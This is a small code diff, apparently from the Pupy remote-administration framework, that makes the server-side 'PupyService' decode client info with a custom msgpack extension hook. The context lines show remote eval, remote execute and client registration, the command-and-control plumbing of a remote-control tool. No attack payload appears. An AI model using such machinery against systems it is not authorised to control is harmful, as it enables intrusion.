@@ -22,6 +22,8 @@ import json
 import zlib
 import msgpack
 
+from network.lib.msgtypes import msgpack_exthook
+
 from . import getLogger
 logger = getLogger('service')
 
@@ -87,7 +89,7 @@ class PupyService(rpyc.Service):
         self.eval = remote_eval
         self.execute = remote_execute
         self.pupyimporter = pupyimporter
-        self.infos = msgpack.loads(infos)
+        self.infos = msgpack.loads(infos, ext_hook=msgpack_exthook)
         self.get_infos = lambda: self.infos
 
         self.pupy_srv.add_client(self)
